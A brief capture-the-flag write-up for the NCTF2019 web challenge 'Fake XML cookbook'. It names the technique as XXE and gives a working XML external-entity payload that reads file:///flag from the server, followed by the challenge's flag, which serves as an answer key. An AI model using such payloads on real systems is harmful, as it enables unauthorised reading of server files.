# Web

## [NCTF2019]Fake XML cookbook

> 知识点：XXE攻击

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY foo SYSTEM "file:///flag">]>
<user><username>&foo;</username><password>0</password></user>
```

> flag{0d3eff71-790b-478b-b3e8-25c89c2519bf}